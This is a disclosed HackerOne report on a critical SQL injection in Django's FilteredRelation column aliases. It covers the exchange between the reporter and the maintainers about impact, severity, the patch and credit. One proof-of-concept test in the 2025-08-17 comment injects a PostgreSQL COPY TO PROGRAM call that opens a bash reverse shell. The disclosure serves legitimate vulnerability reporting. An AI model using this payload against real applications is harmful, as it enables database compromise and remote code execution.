---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/sql-injection
  - env/web
  - stack/python
substate: "resolved"
weakness: "SQL Injection"
enriched: true
date: 2025-09-15
submitted: 2025-08-09T00:54:44.129Z
bounty_usd: null
votes: 96
cve: []
program: "[[programs/django|Django]]"
reporter: "eyalsec"
source: "https://hackerone.com/reports/3292573"
title: "SQL Injection when using FilteredRelation"
---
# SQL Injection when using FilteredRelation

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 96 | **Program:** Django | **Disclosed:** 2025-09-15

- Report: [https://hackerone.com/reports/3292573](https://hackerone.com/reports/3292573)
- CWE: SQL Injection
- Submitted: 2025-08-09T00:54:44.129Z

## Timeline

- **Report Filed**
- **2025-08-10** @eyalsec: This SQL injection is present in multiple places.
- **Report Needs More Info**
- **Report New**
- **2025-08-12** @sarahvboyce: Thank you for the updates

> This SQL injection is present in multiple places.

Can you be specific what you mean here? It would be good for us to make sure we understand the full issue
- **2025-08-12** @eyalsec: What i ment was that the SQL Injection can be found in multiple tests and not only in the "test_select_related_foreign_key" test.
Another example:
{F4671457}

In Django you have 2 kind of protection from what I saw:
__Image 1 - adding strings__
{F4671458}
__Image 2 - using strings__
{F4671460}

In the second image we can see the string that added to the final SQL query, however django check that the sting in image 1 and image 2 is the same string.

# Concusion:
If attacker can add strings and execute them its full SQL Injection.
There are multiple tests where an attacker can exploit  because `FilteredRelation` let an attacker add string and `select_related` let an attacker use it (execute it).

# more info, on other vulnerabilities
I have found 1500+ tests where user can control the sql query, however you check regex so an attacker can't exploit them yet. such as my last CVE that you fixed by adding regex.
- **Report Title Updated**
- **Report Triaged**
- **2025-08-17** @eyalsec: Hi, thank you for triaging the finding :)

The SQLI occurs in multiple databases (not only on sqlite).
As an attacker I am able to run os commands using the SQLI.

__1 example would be in postgresql:__
An attacker may use the COPY command with the PROGRAM attribute as such:
```
    def test_select_related_foreign_key_sqli(self):
        user_data = 'author_join."id", author_join."name", author_join."content_type_id", author_join."object_id" FROM "filtered_relation_book" INNER JOIN "filtered_relation_author" author_join ON ("filtered_relation_book"."author_id" = author_join."id") ; COPY (SELECT \'\') TO PROGRAM \'bash -i >& /dev/tcp/127.0.0.1/1025 0>&1\'; -- '

        qs = (
            Book.objects.annotate(**{
                user_data: FilteredRelation("author"),
        })
            .select_related(user_data)
        )

        qs._fetch_all()

```
After the SQLI:
{F4686961}

I would like to change the impact of the vulnerability to:
Unauthenticated, 0 click, RCE and SQL Injection on multiple databases, using Django with default configuration.
- **2025-08-20** @theorangeone: Severity will be set based on Django's [security policy](https://docs.djangoproject.com/en/5.2/internals/security/#security-issue-severity-levels).

I do agree though that this affects the default configuration on all database backends. We're hoping to have a timeline for the public release soon.
- **2025-08-21** @eyalsec: I understand Django's security policy. However, after my last CVE came out, companies such as NVD, Sync, Red Hat, SUSE, etc, marked my CVE as Medium/High.
And I don't blame them, *"Potential SQL injection in..."* does sound like a high vulnerability.

If you write *"Potential Unauthenticated, 0 click, RCE on PostgreSQL and SQL Injection on multiple databases, using Django with default configuration."* everyone would surely agree that this is a critical vulnerability for them.

And I did send you a POC that proves that it's possible to have *"Potential Unauthenticated, 0 click, RCE on PostgreSQL and SQL Injection on multiple databases, using Django with default configuration"*.

Also, this would be more transparent. Imagine if someone found a vulnerability at your company, and he wouldn't tell you that it could lead to RCE. I want to believe that you wouldn't like it.

If you change the title of the vulnerability, it would mean the world to me <3

Thank you very much, 😊
Eyal
- **2025-08-21** @sarahvboyce: Hello Eyal,

Thank you for your report. We have confirmed the vulnerability, which has been assigned CVE-2025-57833.

I have attached our proposed mitigation solution: {F4700495}
Could you please test the patch to ensure it reliably fixes the issue?

We plan to mention the discoverer of the vulnerability in a blog post. Is "Eyal" okay, or would you prefer to be credited differently?

The Django release with this fix is currently planned for September 3, 2025. Please keep this private until after the updated versions are published.

We have titled the vulnerability "Potential SQL injection in FilteredRelation column aliases". This has been assigned the severity "high" based off our security policy: https://docs.djangoproject.com/en/5.2/internals/security/#security-issue-severity-levels 
Note that there is no level above "high".
- **2025-08-24** @eyalsec: As I said in my last CVE:
> I don't think that regex is the best solution for SQL injection.
The best way to handle SQL injection is by using a prepared statement, if there is a way to use a prepared statement then it would be the optimal thing.

I couldn't exploit it right now, however I do belive that the code can still be exploited if someone will find a way to bypass the regex.

I would like the credit to be to "Eyal Gabay (EyalSec)".

If you have more questions or requests you may ask :)

thaaaaaaank you!
- **Report Resolved**
- **Not Eligible For Bounty**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
